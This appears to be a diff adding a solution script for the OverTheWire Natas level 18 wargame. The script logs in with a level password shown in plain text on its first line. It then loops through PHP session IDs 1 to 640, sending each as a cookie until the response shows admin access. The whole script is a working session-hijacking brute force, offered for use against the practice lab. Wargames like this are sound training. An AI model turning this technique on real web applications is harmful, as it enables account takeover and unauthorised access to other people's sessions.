@@ -1,0 +1,15 @@
+natas18:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+
+import requests
+
+url = 'http://natas18.natas.labs.overthewire.org'
+auth = requests.auth.HTTPBasicAuth('natas18', '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
+params = dict(username='admin', password='s3cr3t')
+
+for sess_id in range(1, 641):
+	print(sess_id)
+	cookies = dict(PHPSESSID=str(sess_id))
+	r = requests.get(url, auth=auth, params=params, cookies=cookies)
+	if "You are an admin" in r.text:
+		print(r.text)
+		break
